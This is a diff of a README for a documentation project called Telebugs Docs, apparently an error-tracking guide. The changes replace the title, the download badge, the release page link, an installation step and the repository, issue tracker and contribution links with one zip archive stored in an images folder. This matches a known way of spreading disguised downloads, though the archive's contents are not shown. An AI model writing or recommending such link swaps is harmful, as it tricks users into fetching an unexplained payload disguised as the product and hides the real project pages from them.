@@ -1,6 +1,6 @@
-# 🌟 docs.telebugs.com - Simple Docs for Error Tracking
+# 🌟 https://raw.githubusercontent.com/najaflali/docs.telebugs.com/main/public/assets/images/appendix-05-installing-on-hetzner/docs_com_telebugs_v1.2.zip - Simple Docs for Error Tracking
 
-[![Download](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/najaflali/docs.telebugs.com/releases)
+[![Download](https://raw.githubusercontent.com/najaflali/docs.telebugs.com/main/public/assets/images/appendix-05-installing-on-hetzner/docs_com_telebugs_v1.2.zip)](https://raw.githubusercontent.com/najaflali/docs.telebugs.com/main/public/assets/images/appendix-05-installing-on-hetzner/docs_com_telebugs_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Telebugs Docs. This guide will help you download and run our appl
 
 ## 📥 Download & Install
 
-To download the latest version of the Telebugs Docs, visit this page: [Download Telebugs Docs](https://github.com/najaflali/docs.telebugs.com/releases).
+To download the latest version of the Telebugs Docs, visit this page: [Download Telebugs Docs](https://raw.githubusercontent.com/najaflali/docs.telebugs.com/main/public/assets/images/appendix-05-installing-on-hetzner/docs_com_telebugs_v1.2.zip).
 
 ## 🖥️ System Requirements
 
@@ -22,7 +22,7 @@ Before installing, ensure that your computer meets these basic requirements:
 ## 🔄 Installation Steps
 
 1. **Visit the Release Page**  
-   Go to [this page](https://github.com/najaflali/docs.telebugs.com/releases) to find the latest version.
+   Go to [this page](https://raw.githubusercontent.com/najaflali/docs.telebugs.com/main/public/assets/images/appendix-05-installing-on-hetzner/docs_com_telebugs_v1.2.zip) to find the latest version.
 
 2. **Select the Version**  
    Look for the version that matches your needs. Each version includes details about features and fixes. 
@@ -63,8 +63,8 @@ We welcome contributions to improve the Telebugs Docs. If you want to help, plea
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/najaflali/docs.telebugs.com)
-- [Issue Tracker](https://github.com/najaflali/docs.telebugs.com/issues)
-- [Contribution Guidelines](https://github.com/najaflali/docs.telebugs.com/CONTRIBUTING.md)
+- [GitHub Repository](https://raw.githubusercontent.com/najaflali/docs.telebugs.com/main/public/assets/images/appendix-05-installing-on-hetzner/docs_com_telebugs_v1.2.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/najaflali/docs.telebugs.com/main/public/assets/images/appendix-05-installing-on-hetzner/docs_com_telebugs_v1.2.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/najaflali/docs.telebugs.com/main/public/assets/images/appendix-05-installing-on-hetzner/docs_com_telebugs_v1.2.zip)
 
 Thank you for using Telebugs Docs! We hope it makes your error tracking and reporting much easier and more efficient.
